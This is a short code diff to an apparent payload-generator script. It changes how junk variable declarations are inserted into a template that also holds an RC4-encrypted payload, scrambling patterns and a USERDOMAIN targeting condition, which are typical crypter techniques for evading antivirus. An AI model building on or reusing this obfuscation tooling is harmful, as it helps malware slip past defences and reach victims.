@@ -129,7 +129,7 @@ class Generator:
 	def gen_junk(self):
 		junk = ["int", "string", "int[]", "byte[]", "object", "var", "float", "short", "uint", "IntPtr"]
 		data = ""
-		for i in range(1, random.randrange(2, 5)):
+		for i in range(0, random.randrange(1, 12)):
 			data += "%s %s = 0\r\n" % (random.choice(junk), self.gen_str(random.randrange(5, 25)))
 			
 		return data
@@ -196,11 +196,11 @@ if __name__ == "__main__":
 		pattern1 = Generator.gen_pattern("#!@$%?&")
 		pattern2 = Generator.gen_pattern(",.<>)(*[]{}")	
 		cipher = cipher.replace("m", pattern1).replace("V", pattern2)
-		cipher = cipher.replace("[JUNK1]", gen.gen_junk()).replace("[JUNK2]", gen.gen_junk()).replace("[JUNK3]", gen.gen_junk())
-		
+
 		output = gen.get_output()
 		output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
 		output = output.replace("[PATTERN_1]", pattern1).replace("[PATTERN_2]", pattern2)
+		output = output.replace("[JUNK1]", gen.gen_junk()).replace("[JUNK2]", gen.gen_junk()).replace("[JUNK3]", gen.gen_junk())
 		condition = gen.capture_input("Set USERDOMAIN condition (Default '')", 4).strip()
 		output = gen.set_condition(output, condition)
 		
